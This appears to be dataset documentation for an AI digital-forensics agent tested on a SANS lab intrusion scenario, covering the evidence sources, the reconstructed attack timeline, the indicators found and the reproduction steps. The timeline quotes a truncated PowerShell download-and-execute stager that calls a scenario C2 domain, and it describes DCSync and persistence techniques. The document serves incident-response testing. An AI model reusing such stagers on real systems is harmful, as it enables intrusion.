# Dataset Documentation — SIFT Assistant

**What the agent was tested against, where the data came from, and what it found.**
Reproducibility starts here: identify the scenario, obtain the identical evidence, re-run the
pipeline, and compare against the documented findings below.

All timestamps UTC. The agent attributes activity to **accounts, hosts, and IPs only** — never to a
named person.

---

## 1. What the agent was tested against

| Field | Value |
|-------|-------|
| **Scenario** | `SRL-2018-Compromised Enterprise Network` |
| **Theme** | Hands-on-keyboard intrusion of a small Windows Active Directory enterprise |
| **Domain** | `shieldbase.lan` |
| **Assets acquired** | 2 hosts — an AD domain controller and an internet-facing RDP / jump host |
| **Evidence types** | Disk images (EnCase `.E01`) + raw memory images (`.img`), per host |
| **Activity window** | 2018-08-24 → 2018-09-06 (incident declared 2018-09-10) |
| **Case ID used in test** | `CLIENT-IR-2026-007` (client labelled *Acme Corp* in the run) |

The scenario is a **SANS-provided, replayable enterprise-intrusion dataset** — one entry in the
**FindEvil HACKATHON-2026 "Compromised APT Attack Scenarios"** collection (see §2 for the source). It
is a self-contained domain with a full attack lifecycle (initial foothold → domain-credential theft →
lateral movement → persistence → data collection) captured in real Windows artifacts. It was chosen
because it exercises the breadth of the pipeline — multiple assets, both disk **and** memory, and
cross-host correlation — rather than a single-artifact puzzle.

### Asset inventory

| Asset ID | Hostname (FQDN) | Role | OS (build) |
|----------|-----------------|------|------------|
| `dc01` | `BASE-DC` (`base-dc.shieldbase.lan`) | Active Directory Domain Controller | Windows Server 2016 Standard (14393) |
| `rd01` | `BASE-RD-01` (`base-rd-01.shieldbase.lan`) | Remote-desktop / jump host | Windows 10 Enterprise 1709 (16299) |

> OS, build, domain role, and install dates above are **derived from the evidence itself** during the
> run (registry `SYSTEM`/`SOFTWARE` hives), not assumed.

---

## 2. Source of data

The agent was run against the **`SRL-2018-Compromised Enterprise Network`** scenario, **provided by
SANS** as part of the FindEvil hackathon evidence set. The four source files were placed, read-only,
under the case `sources/` tree exactly as listed.

**Provenance / where to obtain it.** The scenario is distributed by SANS via the official hackathon
file share, under `HACKATHON-2026 / Compromised APT Attack Scenarios / SRL-2018-Compromised Enterprise
Network`:

> <https://sansorg.egnyte.com/fl/HhH7crTYT4JK#folder-link/HACKATHON-2026/Compromised%20APT%20Attack%20Scenarios/SRL-2018-Compromised%20Enterprise%20Network>

`SRL-2018-…` is the SANS scenario-series name; the same four images downloaded from that folder are the
exact inputs documented here.

### Sources inventory (as tested)

| SourceID | AssetID | Source path | Type | Size |
|----------|---------|-------------|------|------|
| `dc01-disk01` | `dc01` | `sources/dc01/base-dc-cdrive.E01` | Disk image (EWF/E01) | ~12 GB |
| `dc01-memory01` | `dc01` | `sources/dc01/base-dc-memory.img` | Memory image (raw) | ~5.1 GB |
| `rd01-disk01` | `rd01` | `sources/rd01/base-rd-01-cdrive.E01` | Disk image (EWF/E01) | ~17 GB |
| `rd01-memory01` | `rd01` | `sources/rd01/base-rd01-memory.img` | Memory image (raw) | ~3.1 GB |

Full case-relative paths under `/cases/CLIENT-IR-2026-007/`.

### Integrity & read-only handling

All four files are treated as **read-only** end-to-end: the pipeline mounts and parses them without
modification, enforced in code (`evidence_guard.py` blocks any write/`dd`/delete against evidence
paths). Each EnCase `.E01` container carries the acquisition hash recorded at imaging time —
`ewfinfo sources/<asset>/<image>.E01` prints it, so a reproducer can confirm the downloaded disk images
are byte-for-byte the ones documented here.

### Notes on provenance & integrity

- `shieldbase.lan` is a **lab/scenario domain**, not a real organisation; account names, IPs, and the
  `squirreldirectory.com` C2 domain are scenario artifacts.
- Evidence is handled strictly read-only end-to-end; parsed output under `export/` is set immutable
  (`chmod 444`) once written.
- The only large *post-incident* artifact in the data (an F-Response forensic-acquisition transfer on
  2018-09-06) is the responders' own collection, **not** attacker activity — the agent identifies and
  excludes it (see findings).

---

## 3. What it found

Running `/case-investigate` end-to-end (**Parse → Analyze → Correlate → Report**, plus the Phase 4.5
evidence-citation check) over the four sources produced the result below. Every claim in the run is
backed by an `[EV-<asset>-NNNNN]` citation resolved against a per-asset evidence registry.

### Headline conclusion

A **real, hands-on-keyboard intrusion** of the `shieldbase.lan` domain, run end-to-end through a
**single compromised SharePoint SQL service account, `shieldbase\spsql`**, operated from attacker
workstation **172.16.6.14**. The intrusion began **~2 weeks before it was declared** (first observed
action 2018-08-24).

### Reconstructed attack narrative (UTC)

| Date | Stage | What the agent found | Host |
|------|-------|----------------------|------|
| 2018-08-24/25 | Recon / credential access | Network-logon password-guessing from `172.16.6.14` against `Guest`, `spsql`, domain | `rd01` |
| 2018-08-27 | **Domain credential theft (DCSync)** | Non-DC principal `spsql` issued directory-replication ops (EventID 4662, *Get-Changes* / *Get-Changes-All*) from `172.16.6.14` — canonical DCSync signature | `dc01` |
| 2018-08-28 | Hands-on access | First malicious PowerShell C2 stager (`IEX … http://squirreldirectory.com/a`); first RDP logon as `spsql`; attacker RDP client names `hydra`, `shield` | `rd01` |
| 2018-08-27→30 | **Lateral movement (pivot hub)** | 7 services with random 7-char names + loopback admin-share image paths (PsExec/Metasploit signature); "perfmon" tooling staged via admin shares to ≥5 hosts | `rd01` |
| 2018-08-30 | **Persistence** | WMI event subscription (`__EventFilter PerformanceMonitor` → `CommandLineEventConsumer SystemPerformanceMonitor`); **fired under SYSTEM** on the 2018-09-06 reboot | `rd01` |
| 2018-08-31 | Offensive PowerShell on the DC | Windows **Defender detected PowerSploit** (`Trojan:PowerShell/Powersploit.O`, *Severe*) in `C:\Users\spsql\n.ps1` | `dc01` |
| 2018-09-05 | **Data collection & staging** | `spsql` aggregated multi-host backup shares into `C:\Windows\Logs\SysBackup`, then **deleted the ~174 MB archive** (anti-forensic cleanup) | `rd01` |
| 2018-09-06 | Live attacker state at capture | Memory image shows the WMI-spawned `powershell → p.exe` chain running with ~10 active HTTP C2 connections to `172.16.4.10:8080` | `rd01` |

### Indicators developed by the agent (none supplied at intake)

| Indicator | Type |
|-----------|------|
| `shieldbase\spsql` (SID `…-1193`) | Compromised account |
| `172.16.6.14` | Attacker workstation (guessing, RDP, DCSync source) |
| `172.16.4.5` | Attacker relay / pivot + collection share |
| `172.16.4.10:8080` | HTTP C2 endpoint |
| `squirreldirectory.com` | C2 domain |
| `C:\Windows\Temp\Perfmon\` (`p.exe`, `pb.exe`, `csrss.exe`, `ri.exe`, `volrest.exe`, `PerfView.exe`) | Tooling / staging path |
| WMI `__EventFilter PerformanceMonitor` / Consumer `SystemPerformanceMonitor` | Persistence |
| `Trojan:PowerShell/Powersploit.O` — `C:\Users\spsql\n.ps1` | Offensive PowerShell (DC) |

### Calibrated conclusions (what it proved vs. left open)

- **High confidence (multi-source corroborated):** domain compromise via `spsql`; DCSync credential
  theft; offensive PowerShell on both hosts; `rd01` as the lateral-movement pivot with WMI persistence
  that fired under SYSTEM; no log clearing on either host.
- **Medium confidence:** multi-host data was collected and staged on `rd01`, then deleted.
- **Explicitly NOT proven (recorded as gaps, not negative findings):**
  - The **original initial-access vector** (how `spsql` was first obtained, pre-2018-08-24) is upstream
    of both acquired hosts.
  - **Off-network exfiltration is unproven** — collection is evidenced, but the staged archive was
    deleted locally and SRUM shows no anomalous attacker bulk-egress; the only bulk transfer was the
    responders' own F-Response acquisition, which the agent correctly attributes to IR, not the attacker.

### Findings ledger summary

**25 typed findings** across the case — 8 on `dc01`, 10 on `rd01`, 7 cross-asset correlations.
Confidence mix: **17 high, 5 medium, 3 low**. All 25 carry an empty `human_validated_by`: the pipeline
output is a **DRAFT pending independent examiner validation** — by design, the AI never self-validates.

---

## 4. How to reproduce

1. **Obtain** the `SRL-2018-Compromised Enterprise Network` scenario from the SANS hackathon share
   (§2) — the four source files.
2. **Scaffold** the case: `cd /cases/<CASE-ID> && /case-init CLIENT="Acme Corp" ASSETS="dc01 rd01"`.
3. **Place** the four sources read-only under `sources/dc01/` and `sources/rd01/` per the inventory in
   §2, then `/case-scan-sources` to register them.
4. **Preflight** tools: `/tools-preflight`.
5. **Mount** evidence read-only: `/tools-mount`.
6. **Run** the pipeline: `/case-investigate`.
7. **Compare** your output against §3 — the attack narrative, indicators, confidence calibration, and
   the 25-finding ledger are the ground-truth baseline.

Expected products: per-asset analysis reports (`analysis/`), a cross-asset correlation report, a typed
findings ledger (`*-findings.jsonl`), a Phase 4.5 citation-verification verdict, and a watermarked
**DRAFT** PDF report (`reports/`).

---

*SIFT Assistant — submitted to the Finddevil hackathon. An enhancement of teamdfir's protocol-sift.
Tested against the `SRL-2018-Compromised Enterprise Network` scenario.*
